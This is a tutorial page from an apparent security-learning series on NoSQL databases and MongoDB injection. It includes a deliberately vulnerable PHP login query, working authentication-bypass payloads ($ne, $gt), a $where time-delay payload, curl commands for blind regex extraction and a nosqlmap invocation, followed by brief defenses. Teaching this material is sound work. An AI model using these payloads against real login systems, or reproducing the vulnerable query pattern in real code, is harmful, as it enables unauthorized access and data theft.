---
title: "NoSQL Databases and Injection"
topic: "nosql"
tags: [nosql, mongodb, injection, database, authentication-bypass, web-security]
difficulty: intermediate
day: 68
layout: default
parent: Topics
nav_order: 68
---

# NoSQL Databases and Injection

## What You Will Learn
- What NoSQL databases are and how they differ from SQL
- How to interact with MongoDB from the command line
- How NoSQL injection works and how to exploit it
- How to test for NoSQL injection vulnerabilities

## What Is It?

**NoSQL** ("Not Only SQL") databases store data in formats other than traditional relational tables. Common types include:
- **Document stores**: MongoDB, CouchDB (stores JSON-like documents)
- **Key-value stores**: Redis, DynamoDB
- **Wide-column stores**: Cassandra
- **Graph databases**: Neo4j

NoSQL databases have their own query languages and injection vectors. They are commonly used in modern web applications, making NoSQL injection an important attack class.

## MongoDB Basics

MongoDB stores data as BSON (Binary JSON) documents organized in collections.

```bash
# Connect to MongoDB
mongosh "mongodb://IP:27017"

# Authenticated connection
mongosh "mongodb://user:password@IP:27017/database"

# List all databases
show databases

# Select a database
use 'database-name'

# List collections (tables)
show collections

# Collection stats
db.'collection'.stats()

# Find one document
db.'collection'.findOne()

# Find all documents (pretty print)
db.'collection'.find().pretty()

# Find all documents
db.'collection'.find()

# Find with filter
db.'collection'.find({username: "admin"})

# Insert a document
db.'collection'.insertOne({name: "test", value: 123})

# Update
db.'collection'.updateOne({name: "test"}, {$set: {value: 456}})

# Delete
db.'collection'.deleteOne({name: "test"})
```

## NoSQL Injection

NoSQL injection occurs when user input is used in a query without proper sanitization. In MongoDB, queries use JSON/BSON operators. Injecting these operators can bypass authentication or extract data.

### Basic Authentication Bypass

Vulnerable PHP code:

```php
$query = array("username" => $_POST['username'], "password" => $_POST['password']);
$result = $db->users->findOne($query);
```

Normal request:

```
POST /login
username=admin&password=secret
```

NoSQL injection — use the `$ne` (not equal) operator:

```
POST /login
username=admin&password[$ne]=wrongpassword
```

The query becomes:

```json
{"username": "admin", "password": {"$ne": "wrongpassword"}}
```

This returns the admin user because their password is NOT "wrongpassword" — authentication is bypassed.

### Common MongoDB Operators Used in Injection

```json
{"$ne": "value"}       // not equal — bypass auth
{"$gt": ""}            // greater than — matches everything non-empty
{"$regex": "^a"}       // regex match — use for blind extraction
{"$where": "sleep(5000)"}  // JavaScript injection — time-based blind
```

### Blind Injection — Extract Data Character by Character

```bash
# Test if username starts with 'a'
curl -X POST "https://target.com/login" \
  --data 'username[$regex]=^a&password[$ne]=x'

# Continue to find the full username
curl -X POST "https://target.com/login" \
  --data 'username[$regex]=^ad&password[$ne]=x'
```

### Automated Testing

```bash
# nosqlmap — NoSQL injection scanner
python3 nosqlmap.py --attack 1 --url "http://target.com/login" \
  --postdata "username=INJECT&password=test"
```

### Payloads for Different Frameworks

```json
# JSON body injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# URL parameter injection
?username[$ne]=null&password[$ne]=null
```

## Defense

- Validate and sanitize all user input
- Use parameterized queries when available
- Avoid using `$where` with user input (allows JavaScript execution)
- Implement proper authentication that does not rely solely on DB queries
- Use an ORM or ODM that handles query building safely

## Resources

- [PortSwigger — NoSQL Injection](https://portswigger.net/web-security/nosql-injection)
- [HackTricks — MongoDB Injection](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [NoSQLMap — Automated NoSQL Injection](https://github.com/codingo/NoSQLMap)
- [TryHackMe — NoSQL Injection](https://tryhackme.com/)
